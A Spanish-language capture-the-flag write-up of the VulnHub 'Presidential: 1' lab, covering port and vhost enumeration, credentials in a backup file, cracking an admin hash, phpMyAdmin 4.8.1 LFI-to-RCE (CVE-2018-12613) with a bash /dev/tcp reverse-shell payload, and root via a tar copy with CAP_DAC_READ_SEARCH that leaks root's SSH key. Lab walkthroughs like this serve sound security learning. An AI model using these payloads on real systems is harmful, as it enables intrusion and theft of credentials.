---
title: "Presidential: 1 Write-Up - VulnHub"
description: "Presidential: 1 Write-Up - VulnHub"
pubDatetime: 2023-08-30
tags: ["media", "vulnhub", "LFI", "capabilities"]
---

# Reconocimiento

Primeramente, con nmap, realizamos un escaneo de puertos abiertos por TCP junto con sus servicios y versiones.

```bash
❯ nmap -sSCV -p- --open --min-rate 4000 -Pn -n 192.168.18.137

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 17:48 CEST
Nmap scan report for 192.168.18.137
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Ontario Election Services &raquo; Vote Now!
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)
MAC Address: 08:00:27:5F:A2:9C (Oracle VirtualBox virtual NIC
```

Puertos abiertos 80 y 2082.

Por el 2082 corre SSH pero no tenemos credenciales válidas.

## Servicio web

En el puerto 80 se aplica virtual hosting al dominio **votenow.local**. Con gobuster buscamos rutas y directorios con distintas extensiones.

![](@assets/VulnHub/Presidential/vhost.png)

> Para poder acceder a este dominio hay que añadir la siguiente línea al /etc/hosts `192.168.18.137 votenow.local`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://votenow.local -t 200 -x html,php,txt,php.bak,bak

/assets               (Status: 301) [Size: 237] [--> http://192.168.18.137/assets/]
/index.html           (Status: 200) [Size: 11713]
/.html                (Status: 403) [Size: 207]
/config.php.bak       (Status: 200) [Size: 107]
/config.php           (Status: 200) [Size: 0]
/about.html           (Status: 200) [Size: 20194]
/.html                (Status: 403) [Size: 207]
```

Existe un archivo de backup en **http://votenow.local/config.php.bak** que contiene credenciales para una base de datos.

![](@assets/VulnHub/Presidential/backup.png)

`votebox:casoj3FFASPsbyoRP`

Por aquí no hay nada más interesante así que pasamos a buscar subdominios

```bash
❯ gobuster vhost -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://votenow.local/ --append-domain -t 200 | grep -v 400
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://votenow.local/
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: datasafe.votenow.local Status: 200 [Size: 9503]
```

Escaneando subdominios con gobuster encontramos **datasafe.votenow.local** donde se encuentra un panel de login _phpMyAdmin_.

# Intrusión

Las credenciales del `config.php.bak` son válidas.

## Contraseña hasheada

En la base de datos se puede listar un usuario y su contraseña hasheada: `admin:$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i`.

![](@assets/VulnHub/Presidential/hash.png)

Al crackearla (tarda su tiempo) con `john --wordlist /usr/share/seclists/rockyou.txt hash` obtenemos que la contraseña hasheada es **Stella**. Intento conectarme por SSH pero el servidor no deja así que seguimos buscando.

## Versión phpMyAdmin vulnerable

Vemos que la versión del _phpMyAdmin_ es la **4.8.1**, vulnerable a un LFI (CVE-2018-12613). Con `searchsploit -m php/webapps/50457.py` se nos proporciona un script en python en el que se escala a un RCE.
<
Básicamente lo que este script hace es realizar una query SQL tal que así: `select '<?php system("whoami")?>'` en la ruta `/import.php` (realmente se puede hacer desde cualquier ruta).

![](@assets/VulnHub/Presidential/php1.png)

Para luego acceder a la ruta `/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_<phpMyAdmin_cookie>` (donde se acontece el LFI) y el comando se ejecutará automáticamente porque la página interpreta el PHP que previamente hemos inyectado.

![](@assets/VulnHub/Presidential/php2.png)

Mandando la siguiente query: `select '<?php system("bash -i >& /dev/tcp/<IP>/<PUERTO>")?>'` tendremos una webshell al ponernos en escucha y realizar la misma petición de antes: `/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_<phpMyAdmin_cookie>`

Tenemos shell como el usuario apache.

![](@assets/VulnHub/Presidential/apache.png)

Hacemos `su admin` introduciendo **Stella** como contraseña y estamos como el usuario **admin**.

![](@assets/VulnHub/Presidential/user.png)

# Escalada de privilegios

Después de enumerar un rato llego a algo interesante.

Con `getcap -r / 2>/dev/null` buscamos archivos con [Capabilities](https://www.makeuseof.com/understanding-linux-capabilities/) y encontramos que el binario `/usr/bin/tarS` tiene **CAP_DAC_READ_SEARCH** activado. Esta capability básicamente nos deja leer y ejecutar cualquier archivo del sistema.

![](@assets/VulnHub/Presidential/getcap.png)

Vemos que este binario a pesar de ser customizado parece una copia exacta de el comando `tar` por lo que podríamos comprimir cualquier ruta del sistema para luego descomprimirla y ver sus contenidos.

Lo primero que se me ocurre es zipear la clave SSH privada de root para logearnos mediante SSH sin proporcionar contraseña.

Abrimos un servidor HTTP con python y nos traemos el comprimido a nuestra máquina local.

![](@assets/VulnHub/Presidential/tars.png)

```bash
wget 192.168.18.137:8000/id_rsa.tar.gz
```

Ahora descomprimimos el archivo.

```bash
tar -xzvf id_rsa.tar.gz
```

Le asignamos los permisos adecuados. Y nos conectamos por el puerto 2082

```bash
chmod 600 id_rsa

ssh -i id_rsa 192.168.18.138 -p 2082
```

Tenemos root como shell.

![](@assets/VulnHub/Presidential/root.png)
